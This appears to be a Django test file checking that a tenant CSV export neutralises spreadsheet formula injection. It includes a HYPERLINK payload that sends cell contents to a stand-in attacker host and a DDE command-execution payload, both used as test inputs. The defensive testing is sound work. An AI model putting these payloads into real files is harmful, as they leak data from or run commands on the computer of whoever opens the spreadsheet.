"""The tenant CSV export must not hand the landlord an executable spreadsheet.

`csv.writer` quotes and escapes correctly — that stops a value breaking the FILE
format. It does nothing about the value being interpreted as a FORMULA when the
file is opened, and every text cell in this export is attacker-influenced: a
tenant's name, their unit label, their tenancy status. The export is then opened
by the landlord, on his machine, in Excel.
"""
import datetime as dt
from decimal import Decimal

from django.contrib.auth import get_user_model
from rest_framework.test import APIClient, APITestCase

from apps.buildings.models import Building, Unit, UnitClassification, UnitStatus
from apps.common.csv_safety import csv_safe, csv_safe_row
from apps.tenants.models import Tenant, TenantStatus

User = get_user_model()

PAYLOAD = '=HYPERLINK("https://attacker.example/?d="&A1,"Statement")'


class CsvSafetyUnitTests(APITestCase):
    def test_formula_characters_are_neutralised(self):
        for payload in (PAYLOAD, "+1+1", "-2+3", "@SUM(A1)", "\t=1", "\r=1"):
            assert csv_safe(payload).startswith("'"), f"{payload!r} was left executable"

    def test_ordinary_text_is_untouched(self):
        assert csv_safe("Mercy Murunga") == "Mercy Murunga"
        assert csv_safe("DON1A") == "DON1A"

    def test_numbers_are_untouched(self):
        """Prefixing them would break every SUM in the exported sheet."""
        assert csv_safe(12000) == "12000"
        assert csv_safe(-500.5) == "-500.5"

    def test_none_becomes_an_empty_cell(self):
        assert csv_safe(None) == ""

    def test_a_whole_row_is_covered(self):
        row = csv_safe_row(["=cmd|'/c calc'!A0", "Block", 1])
        assert row[0].startswith("'=")
        assert row[1] == "Block"


class TenantExportInjectionTests(APITestCase):
    @classmethod
    def setUpTestData(cls):
        cls.user = User.objects.create_user(
            username="x", email="x@test.com", password="testpass123!", role="owner",
        )
        building = Building.objects.create(name="Export Block", code="EX", total_floors=1)
        unit = Unit.objects.create(
            building=building, label="EX1", monthly_rent=Decimal("10000"),
            classification=UnitClassification.RESIDENTIAL, status=UnitStatus.OCCUPIED_UNPAID,
        )
        # A tenant registered with a formula for a first name. Not far-fetched:
        # names are transcribed from documents at onboarding by whoever is on
        # the desk, and nothing validates the shape of a human name.
        cls.tenant = Tenant.objects.create(
            first_name=PAYLOAD, last_name="Munga", id_number="EXP-1",
            phone="+254700000701", unit=unit, monthly_rent=Decimal("10000"),
            move_in_date=dt.date(2026, 1, 1), status=TenantStatus.ACTIVE,
        )

    def setUp(self):
        self.client = APIClient()
        self.client.force_authenticate(user=self.user)

    def test_the_export_neutralises_a_formula_in_a_tenant_name(self):
        response = self.client.get("/api/tenants/export/")
        assert response.status_code == 200
        body = response.content.decode()

        # The value is present (nothing was silently dropped) but is quoted as
        # text, so no spreadsheet will evaluate it.
        assert "HYPERLINK" in body
        assert "\"'=HYPERLINK" in body
        # And it never appears as a bare formula at the start of a cell.
        for line in body.splitlines():
            for cell in line.split('","'):
                assert not cell.lstrip('"').startswith("="), f"executable cell: {cell!r}"

    def test_the_export_still_contains_the_real_data(self):
        response = self.client.get("/api/tenants/export/")
        body = response.content.decode()
        assert "Munga" in body
        assert "Export Block" in body
        assert "EX1" in body

    def test_the_export_requires_authentication(self):
        anon = APIClient()
        assert anon.get("/api/tenants/export/").status_code == 401
